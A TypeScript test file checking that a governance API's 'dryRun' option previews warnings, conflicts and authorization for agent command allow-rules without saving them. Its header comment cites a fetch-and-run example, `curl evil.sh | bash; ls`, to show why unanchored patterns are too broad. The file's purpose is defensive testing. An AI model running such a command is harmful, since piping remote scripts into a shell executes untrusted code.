// Checking a rule before it is written (QA of 2026-10-19, recommendation R1).
//
// The "broader than it looks" warning and the clash notices came back only in the answer
// to the write, so an operator learned that `echo qa-usability` also allows
// `curl evil.sh | bash; ls` after the rule was already in force for the agent. `dryRun`
// on `policy/rules` runs the same checks, under the same authorization, and writes and
// records nothing.
import { mkdtemp, rm } from "node:fs/promises";
import type { IncomingMessage, ServerResponse } from "node:http";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { Readable } from "node:stream";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { tailLedger } from "../governance/audit-ledger.js";
import { addRuleChecked, loadPolicy, savePolicy } from "../governance/policy-store.js";
import { defaultPolicyDocument } from "../governance/policy-types.js";
import type { GovernanceRole } from "../governance/roles.js";
import type { GovernanceSession } from "../governance/session-tokens.js";
import { seedGroupWithAgents } from "../governance/test-group.js";
import { handleGovernanceApiRequest } from "./governance-dashboard-api.js";

let dir: string;
let groupId: string;

beforeEach(async () => {
  dir = await mkdtemp(join(tmpdir(), "governance-rule-check-"));
  process.env.OPENCLAW_GOVERNANCE_DIR = dir;
  groupId = await seedGroupWithAgents(["agent-a", "agent-b"]);
  await savePolicy(groupId, defaultPolicyDocument());
});

afterEach(async () => {
  delete process.env.OPENCLAW_GOVERNANCE_DIR;
  await rm(dir, { recursive: true, force: true });
});

function session(role: GovernanceRole): GovernanceSession {
  return {
    token: `t-${role}`,
    userId: `id-${role}`,
    username: role,
    role,
    createdAt: new Date().toISOString(),
    expiresAt: new Date(Date.now() + 3_600_000).toISOString(),
    assignedAgents: ["agent-a"],
    groupId,
  };
}

async function call(
  route: string,
  who: GovernanceSession,
  body: Record<string, unknown>,
): Promise<{ status: number; body: any }> {
  const url = `/control-ui/governance/${route}`;
  const raw = JSON.stringify(body);
  const req = Readable.from([Buffer.from(raw)]) as unknown as IncomingMessage;
  Object.assign(req, {
    method: "POST",
    url,
    headers: {
      "content-type": "application/json",
      "content-length": String(Buffer.byteLength(raw)),
    },
  });
  const captured = { status: 0, body: undefined as any };
  const res = {
    statusCode: 200,
    headersSent: false,
    setHeader() {},
    getHeader() {
      return undefined;
    },
    end(chunk?: string) {
      captured.status = (this as { statusCode: number }).statusCode;
      captured.body = chunk ? JSON.parse(chunk) : undefined;
    },
  } as unknown as ServerResponse;
  await handleGovernanceApiRequest(req, res, url, who);
  return captured;
}

function check(who: GovernanceSession, rule: Record<string, unknown>) {
  return call("policy/rules", who, {
    resourceKind: "command",
    description: "qa check",
    dryRun: true,
    ...rule,
  });
}

/** Rules and rule-add ledger entries, so a test can say "nothing changed". */
async function written(): Promise<{ rules: number; added: number }> {
  const policy = await loadPolicy(groupId);
  const entries = await tailLedger(groupId, 1000);
  return {
    rules: policy.rules.length,
    added: entries.filter((entry) => entry.toolName === "governance.policy.rule.add").length,
  };
}

async function existingRule(rule: { pattern: string; agentId?: string }): Promise<void> {
  await addRuleChecked(
    groupId,
    { description: "existing", resourceKind: "command", ...rule },
    { name: "admin", role: "administrator" },
  );
}

describe("checking a rule without writing it", () => {
  it("says an unanchored pattern is broader than it looks, and writes nothing", async () => {
    const before = await written();

    const checked = await check(session("administrator"), {
      pattern: "echo qa-usability",
      agentId: "agent-a",
    });

    expect(checked.status).toBe(200);
    expect(checked.body.dryRun).toBe(true);
    expect(checked.body.warnings.map((warning: { code: string }) => warning.code)).toContain(
      "unanchored",
    );
    expect(checked.body.id).toBeUndefined();
    expect(await written()).toEqual(before);
  });

  it("reports the clash the write would report, against the rules in force", async () => {
    await existingRule({ pattern: "^ls$", agentId: "agent-a" });
    const before = await written();

    const checked = await check(session("administrator"), {
      pattern: "^ls$",
      agentId: "agent-a",
      ttlMinutes: 10,
    });

    expect(checked.status).toBe(200);
    expect(checked.body.conflicts.map((conflict: { kind: string }) => conflict.kind)).toContain(
      "already-permanent",
    );
    expect(checked.body.warnings).toEqual([]);
    expect(await written()).toEqual(before);
  });

  it("compares the agent as the write stores it, folded", async () => {
    await existingRule({ pattern: "^ls$", agentId: "agent-a" });

    const checked = await check(session("administrator"), {
      pattern: "^ls$",
      agentId: "Agent-A",
    });

    expect(checked.status).toBe(200);
    expect(checked.body.conflicts.map((conflict: { kind: string }) => conflict.kind)).toContain(
      "duplicate",
    );
  });

  it("has nothing to say about a narrow rule", async () => {
    const checked = await check(session("user"), { pattern: "^whoami$", agentId: "agent-a" });

    expect(checked.status).toBe(200);
    expect(checked.body).toEqual({ dryRun: true, conflicts: [], warnings: [] });
  });

  it("checks under the same authorization as writing", async () => {
    const before = await written();

    const viewer = await check(session("viewer"), { pattern: "ls", agentId: "agent-a" });
    const foreignAgent = await check(session("user"), { pattern: "ls", agentId: "agent-b" });
    const everyAgent = await check(session("user"), { pattern: "ls" });

    expect([viewer.status, foreignAgent.status, everyAgent.status]).toEqual([403, 403, 403]);
    expect(await written()).toEqual(before);
  });

  it("validates the rule as writing does", async () => {
    const noDescription = await check(session("administrator"), {
      pattern: "^ls$",
      description: "",
    });
    const badPattern = await check(session("administrator"), { pattern: "(" });

    expect([noDescription.status, badPattern.status]).toEqual([400, 400]);
  });

  it("refuses a dryRun that is not true or false, rather than writing", async () => {
    const before = await written();

    const checked = await check(session("administrator"), { pattern: "ls", dryRun: "true" });

    expect(checked.status).toBe(400);
    expect(await written()).toEqual(before);
  });

  it("still writes, and still reports, when dryRun is false", async () => {
    const created = await check(session("administrator"), {
      pattern: "echo qa-usability",
      agentId: "agent-a",
      dryRun: false,
    });

    expect(created.status).toBe(200);
    expect(typeof created.body.id).toBe("string");
    expect(created.body.warnings.map((warning: { code: string }) => warning.code)).toContain(
      "unanchored",
    );
  });
});
